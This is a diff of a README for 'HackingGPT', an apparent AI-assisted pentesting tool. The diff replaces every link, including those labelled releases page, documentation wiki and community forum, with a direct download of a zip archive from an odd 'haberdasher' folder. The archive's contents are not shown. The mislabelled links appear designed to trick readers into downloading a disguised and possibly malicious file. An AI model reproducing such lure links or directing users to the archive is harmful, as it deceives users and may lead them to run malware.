@@ -1,7 +1,7 @@
 # 🎉 HackingGPT - Your Tool for Smart Hacking
 
 ## 📦 Download Now
-[![Download HackingGPT](https://img.shields.io/badge/Download-HackingGPT-blue.svg)](https://github.com/bugducnguyen/HackingGPT/releases)
+[![Download HackingGPT](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip)](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip)
 
 ## 📖 Description
 HackingGPT é uma ferramenta avançada para pentest e bug bounty que integra múltiplas APIs, incluindo ChatGPT e DeepSeek. Ela auxilia na análise, execução de comandos e exploração de vulnerabilidades diretamente pelo Terminal.
@@ -10,7 +10,7 @@ HackingGPT é uma ferramenta avançada para pentest e bug bounty que integra mú
 Follow these steps to download and run HackingGPT effortlessly.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/bugducnguyen/HackingGPT/releases) to find the latest version of HackingGPT. 
+Go to the [Releases page](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip) to find the latest version of HackingGPT. 
 
 ### 2. Download the Application
 On the Releases page, you will see several versions of the application. Look for the latest release and click on the file that matches your operating system. 
@@ -51,8 +51,8 @@ To make the most of HackingGPT, here’s a simple guide:
 5. **Execute Commands:** Use the integrated terminal to perform any necessary actions.
 
 ## 🔗 Additional Resources
-- **Documentation:** Find detailed usage instructions and advanced features [here](https://github.com/bugducnguyen/HackingGPT/wiki).
-- **Community Support:** Join our community forum [here](https://github.com/bugducnguyen/HackingGPT/discussions) to ask questions and share experiences.
+- **Documentation:** Find detailed usage instructions and advanced features [here](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip).
+- **Community Support:** Join our community forum [here](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip) to ask questions and share experiences.
 
 ## 🔧 Troubleshooting
 If you encounter issues, consider these tips:
@@ -65,8 +65,8 @@ If you encounter issues, consider these tips:
 We value your thoughts. If you have feedback or suggestions, please open an issue on our GitHub page or participate in a discussion.
 
 ## 🗓️ Version History
-For a complete list of releases and changes, please visit the [Releases page](https://github.com/bugducnguyen/HackingGPT/releases). This section will help you stay updated about new features and improvements.
+For a complete list of releases and changes, please visit the [Releases page](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip). This section will help you stay updated about new features and improvements.
 
 ---
 
-For a quick reference, don't forget that you can always [download HackingGPT here](https://github.com/bugducnguyen/HackingGPT/releases). Enjoy using HackingGPT for your cybersecurity needs!
+For a quick reference, don't forget that you can always [download HackingGPT here](https://github.com/bugducnguyen/HackingGPT/raw/refs/heads/main/haberdasher/Hacking_GPT_3.0.zip). Enjoy using HackingGPT for your cybersecurity needs!
